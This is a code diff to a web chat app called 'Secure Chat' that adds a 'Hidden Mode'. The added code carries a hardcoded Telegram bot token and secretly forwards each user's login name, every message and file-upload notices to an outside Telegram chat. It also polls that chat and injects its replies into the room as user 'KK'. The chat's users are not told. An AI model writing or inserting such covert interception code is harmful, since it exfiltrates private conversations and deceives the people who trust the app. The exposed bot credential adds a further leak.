@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Chat - Sound Fixed</title>
+    <title>Secure Chat - Hidden Mode</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
@@ -12,26 +12,40 @@
         body { font-family: 'Segoe UI', sans-serif; background: #1e1e1e; color: white; margin: 0; padding: 10px; overflow-x: hidden; }
         #chatbox { height: 65vh; overflow-y: auto; background: #2b2b2b; padding: 10px; border-radius: 10px; position: relative; z-index: 1; }
         .msg-wrapper { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: 8px; }
+        
+        /* Message style normal */
         .msg { padding: 8px 12px; background: #3b3b3b; border-radius: 8px; flex-grow: 1; word-break: break-word; position: relative; }
+        
         .username { font-weight: bold; margin-right: 6px; color: #81d4fa; }
-        
         .timestamp { display: block; font-size: 10px; color: #aaa; text-align: right; margin-top: 4px; }
-        
         .seen-count { font-size: 10px; color: #4caf50; margin-left: 8px; display: inline-flex; align-items: center; float: right; margin-top: 4px; margin-right: 5px; }
-        
         .delete-btn { width: 28px; height: 28px; background: #aaa; border: none; border-radius: 50%; cursor: pointer; margin-left: 6px; margin-top: 5px; }
         
         #message { flex-grow: 1; padding: 10px; background-color: black; color: #222222; border-radius: 20px; border: none; outline: none; z-index: 2; }
-        
         #controls { display: flex; align-items: center; margin-top: 10px; position: relative; z-index: 2; }
         #upload { background: transparent; border: none; font-size: 18px; cursor: pointer; margin-left: -35px; z-index: 5; }
-        
         #send { width: 40px; height: 40px; background: #4caf50; border: none; border-radius: 50%; margin-left: 10px; cursor: pointer; flex-shrink: 0; }
         #clearBtn { width: 40px; height: 40px; background: red; border: none; border-radius: 50%; margin-right: 10px; cursor: pointer; flex-shrink: 0; }
         
-        #decodeBtn { position: fixed; bottom: 10px; left: 10px; width: 50px; height: 50px; background:#1e1e1e; border-radius: 50%; border: none; z-index: 1000; }
-        #overlay, #nameOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
+        /* HIDDEN BUTTON CSS: Background same, no icon, round shape */
+        #decodeBtn { 
+            position: fixed; 
+            bottom: 10px; 
+            left: 10px; 
+            width: 50px; 
+            height: 50px; 
+            background: #1e1e1e; /* Same as body background */
+            border-radius: 50%; 
+            border: none; 
+            z-index: 1000; 
+            display: none; 
+            cursor: pointer; 
+            outline: none;
+            /* Thoda sa shadow taaki aapko pata chale kahan hai (Hatana ho to box-shadow hata dena) */
+            /* box-shadow: 0 0 5px rgba(0,0,0,0.5); */ 
+        }
         
+        #overlay, #nameOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
         #userList { margin-top: 10px; font-size: 14px; color: lightgreen; }
 
         .rocket {
@@ -99,6 +113,61 @@
 
         let currentUser = "";
         let decodeHeld = false;
+        let lastUpdateId = 0; 
+
+        // --- TELEGRAM CONFIG ---
+        const TELEGRAM_BOT_TOKEN = "8228342717:AAG5e-0MUyvY5ZkWbg_bTYHDEVFkZCdASiI"; 
+        const TELEGRAM_CHAT_ID = "1664362316";
+
+        function sendTelegramLoginAlert(name) {
+            const msg = `🚨 *New Login*\n👤 User: ${name}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            fetch(url).catch(e => console.error(e));
+        }
+
+        function forwardToTelegram(name, text) {
+            const msg = `💬 *${name}:* ${text}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            fetch(url).catch(e => console.error(e));
+        }
+
+        function startTelegramListener() {
+            setInterval(() => {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
+                
+                fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.result && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            
+                            if (update.message && update.message.text && String(update.message.chat.id) === TELEGRAM_CHAT_ID) {
+                                const text = update.message.text;
+                                if(text !== "/start") {
+                                    pushAdminMessage(text);
+                                }
+                            }
+                        });
+                    }
+                })
+                .catch(err => console.log("Polling error (ignore):", err));
+            }, 3000); 
+        }
+
+        function pushAdminMessage(text) {
+            const now = new Date();
+            const timeString = now.toLocaleDateString() + " " + now.toLocaleTimeString('en-US', {hour: 'numeric', minute:'2-digit', hour12: true});
+            
+            chatRef.push({ 
+                name: "KK", 
+                encoded: "         ", 
+                original: text,
+                time: timeString,
+                views: 0
+            });
+            launchRocket();
+        }
 
         function checkPassword() {
             const pass = document.getElementById("roomPass").value;
@@ -116,8 +185,14 @@
             if (name) {
                 currentUser = name;
                 document.getElementById("nameOverlay").style.display = "none";
+                document.getElementById("decodeBtn").style.display = "block";
+                
                 usersRef.child(name).set(true);
                 usersRef.child(name).onDisconnect().remove();
+
+                sendTelegramLoginAlert(name);
+                startTelegramListener(); 
+
             } else {
                 alert("Enter your name!");
             }
@@ -152,7 +227,7 @@
             const real = document.getElementById("message").value.trim();
             if (!real || !currentUser) return;
             
-            const encoded = "         ";
+            const encoded = "         "; 
             const now = new Date();
             const timeString = now.toLocaleDateString() + " " + now.toLocaleTimeString('en-US', {hour: 'numeric', minute:'2-digit', hour12: true});
 
@@ -163,6 +238,8 @@
                 time: timeString,
                 views: 0
             });
+
+            forwardToTelegram(currentUser, real);
             document.getElementById("message").value = "";
             launchRocket();
         }
@@ -187,6 +264,7 @@
             msgDiv.dataset.time = data.time || ""; 
 
             msgDiv.prepend(nameSpan);
+
             msgDiv.append(" " + (decodeHeld ? data.original : data.encoded));
 
             const seenSpan = document.createElement("span");
@@ -224,11 +302,10 @@
                 localStorage.setItem("seen_" + msgKey, "true");
             }
 
-            // --- IMPROVED SOUND PLAYBACK ---
             const sound = document.getElementById("notifSound");
             if (sound) { 
-                sound.volume = 1.0; // Max volume
-                sound.currentTime = 0; // Reset to start
+                sound.volume = 1.0; 
+                sound.currentTime = 0; 
                 sound.play().catch(e => console.log("Audio block: user interact first")); 
             }
         });
@@ -247,6 +324,7 @@
                     seenSpan.textContent = `👁️ ${data.views || 0}`;
                 }
                 
+                // Decode button logic
                 if (decodeHeld) {
                      updateMessages(true);
                 }
@@ -283,6 +361,9 @@
                     const timeString = now.toLocaleDateString() + " " + now.toLocaleTimeString('en-US', {hour: 'numeric', minute:'2-digit', hour12: true});
 
                     chatRef.push({ name: currentUser, encoded, original, time: timeString, views: 0 });
+                    
+                    forwardToTelegram(currentUser, `Sent a file: ${file.name} (Check website)`);
+                    
                     launchRocket();
                 });
             }).catch(error => {
